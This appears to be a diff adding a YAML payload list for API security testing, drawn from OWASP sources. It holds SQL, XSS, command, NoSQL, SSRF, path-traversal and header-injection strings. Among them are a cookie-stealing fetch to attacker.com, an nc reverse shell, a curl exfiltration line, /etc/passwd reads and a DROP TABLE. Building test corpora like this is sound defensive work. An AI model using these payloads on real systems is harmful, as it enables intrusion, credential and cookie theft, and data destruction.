@@ -1,0 +1,113 @@
+# OWASP Attack Payloads
+# Curated payloads for API security testing.
+# Sources: OWASP Testing Guide, PayloadsAllTheThings, SecLists
+
+# SQL Injection payloads (OWASP A03)
+sqli:
+  - "' OR '1'='1"
+  - "' OR '1'='1'--"
+  - "' OR '1'='1'/*"
+  - "'; DROP TABLE users;--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' UNION SELECT username,password FROM users--"
+  - "1' AND '1'='1"
+  - "1 OR 1=1"
+  - "' OR ''='"
+  - "admin'--"
+  - "1; WAITFOR DELAY '0:0:5'--"
+  - "1' AND SLEEP(5)--"
+  - "1' ORDER BY 1--"
+  - "1' ORDER BY 10--"
+  - "-1 OR 1=1"
+  - "' HAVING 1=1--"
+  - "' GROUP BY columnnames HAVING 1=1--"
+  - "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+  - "1; SELECT pg_sleep(5);--"
+  - "') OR ('1'='1"
+
+# XSS payloads
+xss:
+  - "<script>alert(1)</script>"
+  - "\"><script>alert(1)</script>"
+  - "<img src=x onerror=alert(1)>"
+  - "javascript:alert(1)"
+  - "'-alert(1)-'"
+  - "<svg/onload=alert(1)>"
+  - "<body onload=alert(1)>"
+  - "<input onfocus=alert(1) autofocus>"
+  - "<marquee onstart=alert(1)>"
+  - "<details open ontoggle=alert(1)>"
+  - "{{7*7}}"
+  - "${7*7}"
+  - "<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>"
+  - "\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>"
+  - "<svg><script>alert(1)</script></svg>"
+
+# Command injection payloads
+cmdi:
+  - "; ls -la"
+  - "| cat /etc/passwd"
+  - "$(whoami)"
+  - "`id`"
+  - "& dir"
+  - "| ping -c 3 127.0.0.1"
+  - "; sleep 5"
+  - "$(sleep 5)"
+  - "| nc -e /bin/sh attacker.com 4444"
+  - "; curl http://attacker.com/$(whoami)"
+  - "& whoami"
+  - "| uname -a"
+  - "`nslookup attacker.com`"
+  - ";{cat,/etc/passwd}"
+  - "${IFS}cat${IFS}/etc/passwd"
+
+# NoSQL injection payloads (MongoDB, CouchDB)
+nosql:
+  - '{"$gt": ""}'
+  - '{"$ne": null}'
+  - '{"$regex": ".*"}'
+  - '{"$where": "1==1"}'
+  - "true, $where: '1 == 1'"
+  - '{"$nin": []}'
+  - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+  - '{"$or": [{"a": 1}, {"b": 1}]}'
+  - '{"username": {"$regex": "^admin"}}'
+  - '{"$and": [{"username": "admin"}, {"password": {"$gt": ""}}]}'
+
+# SSRF payloads
+ssrf:
+  - "http://127.0.0.1"
+  - "http://localhost"
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://[::1]"
+  - "http://0.0.0.0"
+  - "http://0177.0.0.1"
+  - "http://2130706433"
+  - "http://127.1"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "file:///etc/passwd"
+  - "dict://localhost:11211/"
+  - "gopher://127.0.0.1:25/"
+
+# Path traversal payloads
+path_traversal:
+  - "../"
+  - "../../"
+  - "../../../etc/passwd"
+  - "..%2f"
+  - "..%252f"
+  - "%2e%2e/"
+  - "..%c0%af"
+  - "..%255c"
+  - "....//....//etc/passwd"
+  - "..;/..;/etc/passwd"
+
+# Header injection payloads
+header_injection:
+  - "X-Forwarded-For: 127.0.0.1"
+  - "X-Original-URL: /admin"
+  - "X-Rewrite-URL: /admin"
+  - "X-Custom-IP-Authorization: 127.0.0.1"
+  - "X-Forwarded-Host: evil.com"
+  - "X-Host: evil.com"
+  - "X-Forwarded-Server: evil.com"
